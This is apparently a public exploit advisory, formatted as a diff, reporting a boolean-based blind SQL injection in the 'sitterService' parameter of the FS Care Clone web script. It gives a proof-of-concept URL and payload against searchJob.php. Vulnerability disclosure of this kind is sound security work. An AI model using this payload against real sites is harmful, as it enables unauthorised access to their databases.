@@ -1,0 +1,37 @@
+# Exploit Title: FS Care Clone - 'sitterService' SQL Injection
+# Date: 2017-10-24
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/care-clone/
+# Version: 24 October 17
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-10-24
+
+Product & Service Introduction:
+===============================
+This product brings the most ideal solution to launch a portal dealing with every aspect of hiring care in a hasslefree manner.
+
+Technical Details & Description:
+================================
+
+SQL injection on [sitterService] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/searchJob.php?sitterService=1' AND 2728=2728 AND 'fhir'='fhir
+
+Parameter: sitterService (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sitterService=1' AND 2728=2728 AND 'fhir'='fhir
+    
+==================
+8bitsec - [https://twitter.com/_8bitsec]
